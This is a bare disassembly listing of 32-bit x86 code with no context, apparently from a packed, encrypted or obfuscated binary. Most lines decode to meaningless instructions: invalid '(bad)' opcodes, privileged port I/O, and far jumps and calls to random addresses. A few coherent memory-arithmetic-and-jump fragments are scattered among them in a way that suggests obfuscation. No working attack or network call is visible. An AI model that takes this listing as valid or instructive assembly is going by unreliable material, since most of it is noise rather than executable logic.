  402fa0:	in     eax,0x27
  402fa2:	sub    eax,DWORD PTR [ebx-0x18]
  402fa5:	jle    0x402fb2
  402fa7:	push   ebp
  402fa8:	mov    ah,0x7a
  402faa:	repnz lahf 
  402fac:	or     eax,0x75acf6a
  402fb1:	ins    BYTE PTR es:[edi],dx
  402fb2:	fidiv  WORD PTR [edx+edx*8-0x6836f3bb]
  402fb9:	dec    ebp
  402fba:	or     al,0xa5
  402fbc:	mov    ebx,0x64e9288b
  402fc1:	lsl    eax,di
  402fc4:	xor    ecx,ecx
  402fc6:	add    ecx,DWORD PTR ds:0x42a421
  402fcc:	mov    ecx,DWORD PTR [ecx]
  402fce:	add    DWORD PTR ds:0x42a2d9,ecx
  402fd4:	jmp    0x4034df
  402fd9:	cmp    al,0xc8
  402fdb:	rcl    ecx,0xd1
  402fde:	ror    esp,1
  402fe0:	int    0xcb
  402fe2:	sub    bh,al
  402fe4:	stos   BYTE PTR es:[edi],al
  402fe5:	clc    
  402fe6:	or     BYTE PTR [esi+0x781b8ca7],al
  402fec:	js     0x403058
  402fee:	jl     0x403068
  402ff0:	js     0x40303f
  402ff2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402ff3:	fdivr  st(5),st
  402ff5:	jle    0x40305c
  402ff7:	push   0x5
  402ff9:	neg    ebp
  402ffb:	repnz adc esi,0x5
  402fff:	and    DWORD PTR [eax+0x79d5974c],0x60
  403006:	retf   
  403007:	jb     0x402fcd
  403009:	and    esi,DWORD PTR [esi]
  40300b:	cli    
  40300c:	jle    0x40305a
  40300e:	jmp    0x86ab481e
  403013:	adc    edx,DWORD PTR [edx]
  403015:	(bad)  
  403016:	scas   eax,DWORD PTR es:[edi]
  403017:	imul   ebp,DWORD PTR ds:0xf974e0eb,0x4a
  40301e:	das    
  40301f:	adc    al,0x6e
  403021:	int3   
  403022:	jle    0x402fe7
  403024:	xor    al,0xe7
  403026:	cs mov ebp,0xe3f46c5b
  40302c:	sahf   
  40302d:	ss xchg ebx,eax
  40302f:	gs stos DWORD PTR es:[edi],eax
  403031:	pop    esi
  403032:	sbb    eax,DWORD PTR [edx]
  403034:	xchg   ecx,eax
  403035:	loope  0x40309c
  403037:	dec    edi
  403038:	inc    eax
  403039:	mov    cl,0x4e
  40303b:	retf   
  40303c:	icebp  
  40303d:	pushf  
  40303e:	fwait
  40303f:	scas   eax,DWORD PTR es:[edi]
  403040:	jle    0x403086
  403042:	test   eax,0xa9e2f5b8
  403047:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403048:	jns    0x403006
  40304a:	test   eax,0x428b1a10
  40304f:	or     ch,BYTE PTR [ecx+0x2a]
  403052:	fnstcw WORD PTR [eax-0x62]
  403055:	or     BYTE PTR [ecx-0x3a897b31],0xda
  40305c:	inc    ecx
  40305d:	inc    esp
  40305e:	jg     0x403037
  403060:	test   eax,0xc5737c38
  403065:	mov    bl,0xfa
  403067:	jnp    0x40308d
  403069:	pop    eax
  40306a:	lahf   
  40306b:	call   0x558f7da3
  403070:	or     eax,0xadad44
  403075:	mov    al,0xb6
  403077:	test   BYTE PTR [ecx],dh
  403079:	jecxz  0x4030dc
  40307b:	mov    ds:0xa1191ad0,eax
  403080:	or     bl,bh
  403082:	(bad)  
  403083:	cmp    eax,0x29cf68b
  403088:	in     eax,dx
  403089:	not    bh
  40308b:	fimul  DWORD PTR [eax-0x76bf5b10]
  403091:	sbb    bl,BYTE PTR [eax-0x6cdc26cf]
  403097:	push   cs
  403098:	dec    edx
  403099:	pop    esi
  40309a:	push   ds
  40309b:	jg     0x40303f
  40309d:	pop    ss
  40309e:	dec    ebx
  40309f:	inc    eax
  4030a0:	adc    BYTE PTR [edx],al
  4030a2:	popf   
  4030a3:	push   esp
  4030a4:	add    ecx,esi
  4030a6:	jae    0x40305a
  4030a8:	in     eax,0x3f
  4030aa:	les    edx,FWORD PTR [edx+0x4b]
  4030ad:	jns    0x403093
  4030af:	jp     0x403102
  4030b1:	inc    edi
  4030b2:	dec    ecx
  4030b3:	std    
  4030b4:	not    BYTE PTR [esi-0x71]
  4030b7:	sub    ah,BYTE PTR [ebx+0x5d]
  4030ba:	and    al,0xdf
  4030bc:	xor    eax,0x3345a987
  4030c1:	loope  0x403114
  4030c3:	ret    
  4030c4:	add    al,BYTE PTR [eax+0x2079c5ea]
  4030ca:	sub    dh,ah
  4030cc:	iret   
  4030cd:	mov    BYTE PTR [edx],al
  4030cf:	adc    esp,esi
  4030d1:	std    
  4030d2:	or     BYTE PTR [edi+ecx*1],dl
  4030d5:	push   es
  4030d6:	aad    0x8c
  4030d8:	pop    edx
  4030d9:	inc    ecx
  4030da:	push   ebx
  4030db:	adc    eax,0xd36097a0
  4030e0:	ds mov ecx,0x5c8e4e9a
  4030e6:	sub    bl,dl
  4030e8:	ds ret 
  4030ea:	mov    dl,0x66
  4030ec:	(bad)  
  4030ed:	ja     0x403128
  4030ef:	pop    ebp
  4030f0:	or     edx,ebx
  4030f2:	or     bh,0x1a
  4030f5:	mov    al,bl
  4030f7:	adc    esi,edx
  4030f9:	push   edx
  4030fa:	xchg   edi,eax
  4030fb:	out    dx,eax
  4030fc:	push   edi
  4030fd:	mov    ecx,0x1907f6e1
  403103:	fdiv   QWORD PTR [esi+0x1]
  403106:	js     0x40314c
  403108:	call   0x44f7520a
  40310d:	push   0x328fe274
  403112:	dec    ebp
  403113:	test   bl,0x85
  403116:	mov    edx,esp
  403118:	sbb    al,0xac
  40311a:	fs cs addr16 (bad) 
  40311e:	iret   
  40311f:	sub    eax,0xb51a2dd9
  403124:	shr    DWORD PTR [ebp+0x7c],cl
  403127:	das    
  403128:	int    0xdd
  40312a:	sub    BYTE PTR [ebx],dh
  40312c:	dec    edi
  40312d:	jo     0x4030de
  40312f:	stc    
  403130:	cmp    ah,BYTE PTR [ebp-0x3144655f]
  403136:	push   eax
  403137:	retf   
  403138:	in     al,0x1
  40313a:	push   ss
  40313b:	dec    ecx
  40313c:	add    ch,al
  40313e:	pushf  
  40313f:	and    DWORD PTR [ecx+0x50],0x74
  403143:	dec    edi
  403144:	dec    ecx
  403145:	jne    0x403154
  403147:	and    dl,BYTE PTR [edi]
  403149:	(bad)  
  40314a:	push   edi
  40314b:	and    dl,BYTE PTR [edi+0x715c7dc5]
  403151:	sub    eax,0xaf0a1ca
  403156:	gs sbb ah,bh
  403159:	les    edx,FWORD PTR [edx+0x4]
  40315c:	mov    eax,ds:0xcbb99f3c
  403161:	in     eax,dx
  403162:	shr    DWORD PTR [ebp+0x5c],cl
  403165:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403166:	ins    DWORD PTR es:[edi],dx
  403167:	mov    eax,0xe6270b21
  40316c:	nop
  40316d:	daa    
  40316e:	add    DWORD PTR [ecx+0x4e],ebp
  403171:	test   al,0x34
  403173:	push   eax
  403174:	or     bl,cl
  403176:	push   ebp
  403177:	mov    edi,0xdc305c
  40317c:	out    dx,eax
  40317d:	cmp    cl,BYTE PTR [esi]
  40317f:	xchg   BYTE PTR [ecx],dh
  403181:	adc    BYTE PTR [ecx],dl
  403183:	dec    ebp
  403184:	lds    eax,FWORD PTR [esi+eiz*4-0x5a]
  403188:	jb     0x403165
  40318a:	fidiv  WORD PTR [edi]
  40318c:	push   edi
  40318d:	push   eax
  40318e:	xchg   esi,eax
  40318f:	push   esp
  403190:	mov    edx,0x3eb81eed
  403195:	cmp    ecx,ebx
  403197:	fsub   DWORD PTR [ebx+0x4569e52c]
  40319d:	push   esi
  40319e:	mov    bl,ah
  4031a0:	and    BYTE PTR [edi+0x60],ch
  4031a3:	jb     0x40321f
  4031a5:	fs jno 0x403219
  4031a8:	dec    ebp
  4031a9:	cmp    cl,BYTE PTR [eax]
  4031ab:	pushf  
  4031ac:	push   0x20
  4031ae:	push   ebx
  4031af:	mov    esi,0x980499a1
  4031b4:	xchg   esp,eax
  4031b5:	lods   al,BYTE PTR ds:[esi]
  4031b6:	xchg   edi,eax
  4031b7:	push   ecx
  4031b8:	stos   DWORD PTR es:[edi],eax
  4031b9:	mov    esp,esp
  4031bb:	call   0x3504646c
  4031c0:	repz push es
  4031c2:	lods   eax,DWORD PTR ds:[esi]
  4031c3:	sub    BYTE PTR [ebx],dl
  4031c5:	add    eax,0x824dad76
  4031ca:	push   ds
  4031cb:	dec    edx
  4031cc:	sbb    DWORD PTR [eax+0x2ed84070],ebp
  4031d2:	loope  0x403218
  4031d4:	aas    
  4031d5:	pop    ds
  4031d6:	sub    edi,DWORD PTR [esi+edx*4-0x669afab]
  4031dd:	cmp    esp,DWORD PTR [ecx]
  4031df:	test   eax,0x66530c8c
  4031e4:	push   0xaaccba93
  4031e9:	fwait
  4031ea:	mov    WORD PTR [esi+0x4366f448],gs
  4031f0:	lahf   
  4031f1:	bound  edx,QWORD PTR [edx-0x6d]
  4031f4:	cli    
  4031f5:	mov    dh,0xbc
  4031f7:	sbb    BYTE PTR [ecx+ebx*8-0x5b87eac7],0x86
  4031ff:	sti    
  403200:	outs   dx,DWORD PTR ds:[esi]
  403201:	and    eax,DWORD PTR [esi-0xac03a3d]
  403207:	xchg   esp,eax
  403208:	jmp    0x6469c081
  40320d:	cs add al,0x82
  403210:	enter  0xd027,0x30
  403214:	push   ebx
  403215:	sub    edx,DWORD PTR [edx+0x52]
  403218:	popa   
  403219:	or     DWORD PTR ds:0xd5bb343e,ebp
  40321f:	call   0xc3eb:0x1f79d5db
  403226:	out    0x53,eax
  403228:	in     al,dx
  403229:	adc    al,0xb6
  40322b:	je     0x4032ac
  40322d:	xchg   ecx,eax
  40322e:	jne    0x4032a7
  403230:	call   0x2d54:0x9ea551e7
  403237:	fistp  WORD PTR [ebx-0x4e832deb]
  40323d:	call   0xf8c1aef8
  403242:	cmp    ebp,DWORD PTR [ecx]
  403244:	mov    eax,ds:0x529fc15b
  403249:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40324a:	imul   ecx,DWORD PTR [eax-0x7a],0x7b10723a
  403251:	ss ret 0x75bc
  403255:	mov    edx,0xf7d7667d
  40325a:	out    0x54,eax
  40325c:	sbb    al,0x56
  40325e:	jo     0x4032c0
  403260:	test   eax,0x686cce40
  403265:	jge    0x40326d
  403267:	out    dx,al
  403268:	xchg   BYTE PTR [esi+0x2e],bl
  40326b:	stos   BYTE PTR es:[edi],al
  40326c:	sub    BYTE PTR [edx-0x1e],bh
  40326f:	out    dx,al
  403270:	(bad)  
  403271:	out    0x9a,al
  403273:	jb     0x4032b7
  403275:	jecxz  0x40326b
  403277:	jb     0x403243
  403279:	xor    BYTE PTR [edi],0xb8
  40327c:	cmc    
  40327d:	push   esp
  40327e:	into   
  40327f:	das    
  403280:	or     al,0x5c
  403282:	scas   al,BYTE PTR es:[edi]
  403283:	mov    cl,0x1c
  403285:	pusha  
  403286:	cdq    
  403287:	jmp    0x10e7:0x4c1234e2
  40328e:	jno    0x4032a6
  403290:	jmp    0xd3f00c6b
  403295:	out    0xbf,eax
  403297:	inc    ecx
  403298:	lds    ebx,FWORD PTR [eax+ebx*4-0x38]
  40329c:	rep stos BYTE PTR es:[edi],al
  40329e:	xlat   BYTE PTR ds:[ebx]
  40329f:	fldenv [ecx-0x65ef51c1]
  4032a5:	aad    0x96
  4032a7:	clc    
  4032a8:	arpl   WORD PTR ds:0x71786c,si
  4032ae:	(bad)  
  4032af:	(bad)  
  4032b0:	ins    DWORD PTR es:[edi],dx
  4032b1:	clc    
  4032b2:	cmp    cl,BYTE PTR [ebx+edi*8+0x2ebca00f]
  4032b9:	push   esp
  4032ba:	imul   esp,DWORD PTR [eax],0xcba214bc
  4032c0:	not    dh
  4032c2:	sub    ah,ah
  4032c4:	cld    
  4032c5:	xchg   ebx,eax
  4032c6:	pusha  
  4032c7:	bound  ebp,QWORD PTR [esi+0x22]
  4032ca:	mov    ds:0x46ee774a,al
  4032cf:	pop    ds
  4032d0:	xchg   ebp,eax
  4032d1:	addr16 ja 0x40328f
  4032d4:	pop    ds
  4032d5:	inc    ebp
  4032d6:	xor    DWORD PTR [esi],edx
  4032d8:	inc    edx
  4032d9:	inc    ebp
  4032da:	aam    0x14
  4032dc:	dec    ebp
  4032dd:	inc    ebx
  4032de:	nop
  4032df:	mov    DWORD PTR [edi],edi
  4032e1:	jmp    0x36f1:0x2103aa9c
  4032e8:	mov    dh,0xb3
  4032ea:	inc    esi
  4032eb:	mov    bl,0xb8
  4032ed:	cld    
  4032ee:	xor    ebx,DWORD PTR [edi]
  4032f0:	imul   ax,ax,0xff89
  4032f4:	mov    esp,DWORD PTR [edx-0x3f]
  4032f7:	retf   
  4032f8:	es leave 
  4032fa:	inc    eax
  4032fb:	fdiv   st,st(7)
  4032fd:	cmp    BYTE PTR [ebx-0x37ffb19f],ch
  403303:	imul   ebp,edx,0xffffffa9
  403306:	aaa    
  403307:	adc    DWORD PTR [esi+0x5d],ebp
  40330a:	dec    esp
  40330b:	xchg   esp,eax
  40330c:	pop    ebx
  40330d:	sar    edx,0xbb
  403310:	cli    
  403311:	hlt    
  403312:	fistp  QWORD PTR [esi]
  403314:	mov    al,0x7c
  403316:	cmp    BYTE PTR ds:0x7b8291ba,bh
  40331c:	xor    al,0xde
  40331e:	add    al,0xa0
  403320:	dec    ebp
  403321:	cmp    eax,DWORD PTR [edi+0x16]
  403324:	cld    
  403325:	mov    ebx,0xf3c592e9
  40332a:	adc    eax,0x35
  40332d:	test   eax,0x6f98667c
  403332:	jmp    0x9e845f8d
  403337:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403338:	jmp    0x7a387f3a
  40333d:	arpl   WORD PTR [edi],cx
  40333f:	fadd   QWORD PTR [eax+0x17076c4d]
  403345:	call   0x91c5:0xf7bfdb27
  40334c:	fmul   QWORD PTR [ecx+0x4f]
  40334f:	and    BYTE PTR ds:0x8080e9cd,0x90
  403356:	popa   
  403357:	add    eax,0xea344c40
  40335c:	iret   
  40335d:	pop    esp
  40335e:	lea    esi,[edx+ecx*4]
  403361:	or     al,0xf9
  403363:	adc    DWORD PTR [ecx+0x22],ebx
  403366:	retf   
  403367:	lock mov al,ds:0x2f5ee6cd
  40336d:	lods   eax,DWORD PTR ds:[esi]
  40336e:	sbb    esi,DWORD PTR [edi]
  403370:	xchg   esi,eax
  403371:	mov    ebx,0xc8275394
  403376:	or     bl,BYTE PTR [edi+0x59]
  403379:	push   es
  40337a:	adc    esp,ebx
  40337c:	mov    edi,0x8a20f34e
  403381:	push   ebx
  403382:	(bad)  
  403383:	hlt    
  403384:	call   0xc390:0xa1b9dcea
  40338b:	sub    ch,BYTE PTR [esi+esi*2+0x78]
  40338f:	fild   DWORD PTR [esi]
  403391:	outs   dx,DWORD PTR ds:[esi]
  403392:	sub    al,0xb3
  403394:	clc    
  403395:	in     eax,0x6f
  403397:	mov    WORD PTR cs:[ebx+edx*2-0x35],es
  40339c:	xchg   esp,eax
  40339d:	pop    ecx
  40339e:	sahf   
  40339f:	pop    ss
  4033a0:	mov    ecx,0x4cd6cd30
  4033a5:	frstor [edx+ebx*2+0x6c1b8978]
  4033ac:	les    ecx,FWORD PTR [ebp-0x79]
  4033af:	add    esp,esi
  4033b1:	add    al,0x25
  4033b3:	aam    0xd3
  4033b5:	jno    0x4033b0
  4033b7:	dec    esi
  4033b8:	pop    ecx
  4033b9:	mov    ch,0x5d
  4033bb:	cld    
  4033bc:	dec    ecx
  4033bd:	mov    dl,0xae
  4033bf:	repnz mov eax,ds:0x5bd9e45f
  4033c5:	iret   
  4033c6:	mov    ecx,0xef6ddb5a
  4033cb:	lds    eax,FWORD PTR [edx]
  4033cd:	sbb    cl,ch
  4033cf:	mov    ax,ds:0xa2ac94b7
  4033d5:	popa   
  4033d6:	adc    eax,0xb6f2e452
  4033db:	inc    edx
  4033dc:	das    
  4033dd:	aaa    
  4033de:	jge    0x4033bb
  4033e0:	fld    QWORD PTR [edi-0x2fa0119d]
  4033e6:	loopne 0x403378
  4033e8:	push   ss
  4033e9:	jae    0x4033b3
  4033eb:	ins    DWORD PTR es:[edi],dx
  4033ec:	(bad)  
  4033ed:	push   cs
  4033ee:	pop    esp
  4033ef:	bound  ebp,QWORD PTR [eax]
  4033f1:	mov    ds,WORD PTR [ebp-0x74]
  4033f4:	pop    ebp
  4033f5:	and    eax,0x1ff7176d
  4033fa:	pop    ebp
  4033fb:	mov    ch,0x1b
  4033fd:	fstp   DWORD PTR [ecx]
  4033ff:	sbb    ecx,DWORD PTR [ebp-0x6effd3bc]
  403405:	fld    st(7)
  403407:	and    edx,DWORD PTR ds:0xf2a6c9ed
  40340d:	ins    DWORD PTR es:[edi],dx
  40340e:	mov    esp,0xce7da101
  403413:	and    DWORD PTR [ecx+0x40],0xc473f395
  40341a:	call   0xc91f5ad0
  40341f:	in     eax,0x8c
  403421:	shl    ebp,0x1f
  403424:	push   ebp
  403425:	add    DWORD PTR [ebx-0xf],0xf4cec7a0
  40342c:	fs retf 
  40342e:	xchg   edi,eax
  40342f:	jmp    0x4034a4
  403431:	xchg   BYTE PTR [ebp*2+0x11b448d],al
  403438:	xor    ch,ah
  40343a:	stc    
  40343b:	xlat   BYTE PTR ds:[ebx]
  40343c:	adc    eax,0x16dfd72e
  403441:	into   
  403442:	add    DWORD PTR [ebx+0x60aaa64b],esp
  403448:	add    al,al
  40344a:	mov    al,0x7e
  40344c:	and    al,0x23
  40344e:	and    BYTE PTR [eax+0x30],dl
  403451:	adc    eax,0xf73907e7
  403456:	ror    al,0xd0
  403459:	mov    edi,0x5d69de27
  40345e:	push   eax
  40345f:	adc    esp,DWORD PTR [ebp+0x32401642]
  403465:	cmc    
  403466:	sbb    al,0x85
  403468:	mov    edx,0xdf8ea167
  40346d:	xchg   DWORD PTR [ebx+0x10658554],edi
  403473:	jp     0x40345e
  403475:	xor    BYTE PTR [edi+0x71],dh
  403478:	mov    al,ds:0xf02efb96
  40347d:	sub    dl,BYTE PTR [ebx-0x66]
  403480:	pop    ss
  403481:	imul   edx,DWORD PTR [edx-0xe8803ad],0xffffff95
  403488:	(bad)  
  403489:	cmc    
  40348a:	cld    
  40348b:	sub    DWORD PTR [eax-0x2a4fc788],esi
  403491:	add    DWORD PTR ds:0xa5703daa,eax
  403497:	lods   al,BYTE PTR ds:[esi]
  403498:	into   
  403499:	jae    0x4034a3
  40349b:	mov    edx,0x524677fa
  4034a0:	cmp    BYTE PTR [eax-0xf],al
  4034a3:	xchg   BYTE PTR ds:0xec847520,dh
  4034a9:	test   eax,0x437d09ad
  4034ae:	jnp    0x4034c1
  4034b0:	mov    al,ds:0xcc573f30
  4034b5:	iret   
  4034b6:	xchg   ebx,eax
  4034b7:	shr    DWORD PTR [ebx],0x5b
  4034ba:	xor    ebp,eax
  4034bc:	push   edi
  4034bd:	push   ss
  4034be:	int    0x76
  4034c0:	mov    dl,0xf9
  4034c2:	fcom   QWORD PTR [ecx-0x2b]
  4034c5:	adc    esp,DWORD PTR [esi-0x2594014f]
  4034cb:	xlat   BYTE PTR ds:[ebx]
  4034cc:	(bad)  
  4034ce:	loopne 0x403452
  4034d0:	(bad)  
  4034d1:	in     eax,dx
  4034d2:	mov    DWORD PTR [ebx-0x19],eax
  4034d5:	leave  
  4034d6:	(bad)  
  4034d7:	push   0xffffffb2
  4034d9:	ss int 0xfc
  4034dc:	mov    fs,WORD PTR [ebp-0xbba763f]
  4034e2:	mov    DWORD PTR [ebp-0x28],0xf89c853d
  4034e9:	mov    eax,ds:0x42a2f9
  4034ee:	xor    eax,DWORD PTR ds:0x42a37d
  4034f4:	mov    ds:0x42a2f9,eax
  4034f9:	mov    BYTE PTR [ebp-0x11],0x67
  4034fd:	and    DWORD PTR ds:0x42a3c9,edi
  403503:	jmp    0x403a0e
  403508:	ror    edi,cl
  40350a:	iret   
  40350b:	(bad)  
  40350c:	rol    esi,cl
  40350e:	(bad)  
  403510:	stos   BYTE PTR es:[edi],al
  403511:	adc    al,0xb1
  403513:	jb     0x4034ea
  403515:	xchg   ebp,eax
  403516:	ins    BYTE PTR es:[edi],dx
  403517:	pop    ss
  403518:	(bad)  
  403519:	push   ds
  40351a:	js     0x403594
  40351c:	push   0x7c
  40351e:	js     0x403598
  403520:	mov    ds:0x4e4b8901,al
  403525:	push   edi
  403526:	loope  0x40351c
  403528:	push   ecx
  403529:	add    ebp,DWORD PTR [eax]
  40352b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40352c:	xor    edx,DWORD PTR [ebp+edi*1-0x12e97995]
  403533:	mov    ecx,0x55880a7c
  403538:	adc    BYTE PTR [ebx+0x16],bl
  40353b:	mov    dh,0x28
  40353d:	inc    esp
  40353e:	mov    dl,0xd3
  403540:	dec    eax
  403541:	mov    eax,0x57304e03
  403546:	xchg   ecx,eax
  403547:	xchg   BYTE PTR [ecx-0x344787c9],dl
  40354d:	jl     0x4035cd
  40354f:	or     ah,BYTE PTR ds:0x8e513051
  403555:	mov    esi,0x82cb9022
  40355a:	stos   DWORD PTR es:[edi],eax
  40355b:	test   BYTE PTR [ecx-0x56d0b0a0],cl
  403561:	jo     0x40359b
  403563:	ss xor al,0xc4
  403566:	or     BYTE PTR [edx+0x4e45f9e7],0x80
  40356d:	and    BYTE PTR [edi+ecx*2-0x47f8641c],al
  403574:	or     ebp,edi
  403576:	ins    DWORD PTR es:[edi],dx
  403577:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403578:	in     al,0xd8
  40357a:	and    edi,esi
  40357c:	sub    DWORD PTR [edi],esp
  40357e:	cmp    bl,dl
  403580:	jecxz  0x403570
  403582:	adc    BYTE PTR [ecx],0xbd
  403585:	mov    eax,0x1c53a585
  40358a:	(bad)  
  40358b:	jmp    0x403547
  40358d:	xchg   DWORD PTR [ebp+ecx*1-0x55],ecx
  403591:	repnz in eax,dx
  403593:	es sub al,0xf4
  403596:	(bad)  
  403597:	enter  0x5f50,0x2f
  40359b:	test   DWORD PTR [ebp+0x29],0xd624385d
  4035a2:	pop    eax
  4035a3:	adc    al,0x41
  4035a5:	cmc    
  4035a6:	(bad)  
  4035a7:	mov    edx,0x1aa5ded
  4035ac:	xchg   ebp,eax
  4035ad:	lods   eax,DWORD PTR ds:[esi]
  4035ae:	mov    ah,0xac
  4035b0:	repnz xor eax,0x9c0462d6
  4035b6:	enter  0xea66,0x64
  4035ba:	adc    eax,0x4483e506
  4035bf:	cmp    eax,0x2a7ac634
  4035c4:	adc    ah,BYTE PTR [esi+0x5ff4f7f3]
  4035ca:	cs jge 0x4035fb
  4035cd:	pop    es
  4035ce:	push   esp
  4035cf:	jb     0x40357c
  4035d1:	push   ss
  4035d2:	mov    eax,ds:0xcd880d12
  4035d7:	xor    eax,0xe2449798
  4035dc:	stc    
  4035dd:	ss std 
  4035df:	push   0xffffff89
  4035e1:	push   ebp
  4035e2:	fs ins DWORD PTR es:[edi],dx
  4035e4:	neg    BYTE PTR [ecx-0x66]
  4035e7:	gs js  0x403637
  4035ea:	mov    bl,0x30
  4035ec:	jmp    0x4035ab
  4035ee:	mov    esp,0x7a7c27c8
  4035f3:	(bad)  
  4035f5:	pop    edx
  4035f6:	repnz cdq 
  4035f8:	mov    eax,ds:0x4d221a53
  4035fd:	push   ebx
  4035fe:	das    
  4035ff:	fincstp 
  403601:	inc    eax
  403602:	enter  0x416a,0xc6
  403606:	cmp    eax,0x4fcea12b
  40360b:	jmp    0x9ba78860
  403610:	pop    ebx
  403611:	lds    edx,FWORD PTR [ebx]
  403613:	xor    BYTE PTR [eax-0x66104996],bh
  403619:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40361a:	mov    ecx,0x48d0dc8f
  40361f:	jb     0x403601
  403621:	ja     0x4035da
  403623:	push   esi
  403624:	test   al,0xe4
  403626:	mov    al,0x67
  403628:	push   ds
  403629:	imul   ebx,esp,0xffffffd2
  40362c:	push   ecx
  40362d:	test   DWORD PTR [ebp-0x1ad00fec],ebp
  403633:	add    dh,cl
  403635:	out    0x23,al
  403637:	cmp    esi,DWORD PTR ds:0xe6d42ed5
  40363d:	shr    BYTE PTR [edx],0x30
  403640:	or     ah,cl
  403642:	adc    cl,BYTE PTR [esi-0x34f7e1b2]
  403648:	or     cl,BYTE PTR [edx-0x7540ebda]
  40364e:	int3   
  40364f:	inc    esi
  403650:	sbb    al,0xe8
  403652:	in     al,dx
  403653:	push   cs
  403654:	outs   dx,BYTE PTR ds:[esi]
  403655:	mov    bh,0x67
  403657:	inc    ecx
  403658:	into   
  403659:	ror    BYTE PTR [edx],1
  40365b:	inc    edx
  40365c:	test   cl,ch
  40365e:	add    ebp,edx
  403660:	mov    DWORD PTR [ebx+0x78ca849a],0xb01e45a6
  40366a:	pushf  
  40366b:	ror    al,1
  40366d:	je     0x4036ed
  40366f:	add    eax,0xcc3b1fdb
  403674:	pop    ecx
  403675:	pushf  
  403676:	jnp    0x4036bc
  403678:	push   es
  403679:	aad    0x40
  40367b:	jmp    0x3942:0x27c33154
  403682:	enter  0x5f79,0xc
  403686:	clc    
  403687:	add    DWORD PTR [edx],ecx
  403689:	(bad)  
  40368a:	out    dx,eax
  40368b:	mov    cl,0x93
  40368d:	mov    BYTE PTR [edi],bh
  40368f:	and    eax,0x35a62634
  403694:	es aas 
  403696:	dec    ebp
  403697:	and    dl,BYTE PTR [eax+ebx*4]
  40369a:	sbb    DWORD PTR [edi-0x28695367],esp
  4036a0:	lods   al,BYTE PTR ds:[esi]
  4036a1:	or     BYTE PTR [edx+ebx*8],dl
  4036a4:	ins    DWORD PTR es:[edi],dx
  4036a5:	pusha  
  4036a6:	cmp    eax,0xeb19c57b
  4036ab:	rcl    BYTE PTR [ecx],1
  4036ad:	mov    eax,ds:0xf15e4eb9
  4036b2:	inc    edi
  4036b3:	popa   
  4036b4:	xchg   esp,eax
  4036b5:	pushf  
  4036b6:	pop    ecx
  4036b7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4036b8:	in     eax,dx
  4036b9:	retf   
  4036ba:	int    0x9a
  4036bc:	ss dec ecx
  4036be:	int    0x6d
  4036c0:	(bad)  [eax-0x33]
  4036c3:	popf   
  4036c4:	mov    ah,0x47
  4036c6:	push   cs
  4036c7:	retf   0x3072
  4036ca:	iret   
  4036cb:	aam    0xf8
  4036cd:	jmp    0xc3b8d042
  4036d2:	push   esi
  4036d3:	into   
  4036d4:	adc    edx,DWORD PTR [edx]
  4036d6:	adc    eax,DWORD PTR [ebp+eiz*2-0x1c0509d4]
  4036dd:	xchg   esi,ecx
  4036df:	add    bl,BYTE PTR [ecx]
  4036e1:	or     cl,BYTE PTR [ecx+eax*2-0x2a14fb0]
  4036e8:	inc    edi
  4036e9:	pop    esp
  4036ea:	push   edi
  4036eb:	jae    0x403704
  4036ed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4036ee:	shl    DWORD PTR [ebx+0x6d],cl
  4036f1:	sbb    al,0x5c
  4036f3:	mov    ebp,0x2abe88e5
  4036f8:	cmp    BYTE PTR [ebx+0x6f],0x82
  4036fc:	loopne 0x403682
  4036fe:	and    eax,0x23026331
  403703:	daa    
  403704:	sbb    al,0x49
  403706:	jb     0x403691
  403708:	sub    cl,BYTE PTR gs:0x5701e13
  40370f:	pop    edx
  403710:	js     0x40378d
  403712:	sub    DWORD PTR [edi-0xd0c3a94],edi
  403718:	push   ebp
  403719:	icebp  
  40371a:	aaa    
  40371b:	sar    cl,0xf6
  40371e:	xchg   ebx,eax
  40371f:	imul   eax,esi,0x52
  403722:	add    DWORD PTR [esi-0x5f],0x50ff92f2
  403729:	push   edx
  40372a:	fstp   DWORD PTR [edi+0x59f7785a]
  403730:	imul   esp,DWORD PTR [esp+ecx*1-0x18],0xffffff96
  403735:	in     eax,0xa2
  403737:	sbb    al,0x50
  403739:	push   ebx
  40373a:	sti    
  40373b:	hlt    
  40373c:	push   edi
  40373d:	xchg   edi,edx
  40373f:	mov    dh,0x2b
  403741:	lock scas al,BYTE PTR es:[edi]
  403743:	xchg   esp,eax
  403744:	or     BYTE PTR [esi-0x52],cl
  403747:	std    
  403748:	mov    bl,0xe4
  40374a:	hlt    
  40374b:	into   
  40374c:	mov    DWORD PTR [esi-0x51],0x7a26e828
  403753:	in     eax,0x2d
  403755:	jae    0x403742
  403757:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403758:	fsub   DWORD PTR [ebp-0x543b05f7]
  40375e:	mov    dh,0xa6
  403760:	ja     0x403711
  403762:	popf   
  403763:	cmp    eax,0xc00ccfef
  403768:	jecxz  0x4037ac
  40376a:	(bad)  [edi-0x1c]
  40376d:	adc    eax,ecx
  40376f:	pop    eax
  403770:	je     0x403771
  403772:	jmp    0xb853367e
  403777:	push   es
  403778:	dec    ebp
  403779:	fdivp  st(2),st
  40377b:	inc    esi
  40377c:	inc    esi
  40377d:	jmp    0x3b03ef01
  403782:	dec    edi
  403783:	lea    eax,[ebx+edx*1-0x62]
  403787:	push   ss
  403788:	cmp    cl,dh
  40378a:	pusha  
  40378b:	mov    esi,0x2df7a605
  403790:	mov    dh,0xe3
  403792:	sub    eax,0x79f7a1d6
  403797:	bound  edx,QWORD PTR [eax+0x25]
  40379a:	pop    edi
  40379b:	scas   al,BYTE PTR es:[edi]
  40379c:	sbb    BYTE PTR [eax-0x2bcac851],ch
  4037a2:	add    BYTE PTR [esi+eax*1-0x5b51b9b2],dl
  4037a9:	jno    0x4037b9
  4037ab:	jne    0x403779
  4037ad:	and    edi,DWORD PTR [ebx+0x3c69f99f]
  4037b3:	jge    0x403795
  4037b5:	stos   DWORD PTR es:[edi],eax
  4037b6:	sub    DWORD PTR [esi-0x2],esi
  4037b9:	ja     0x403790
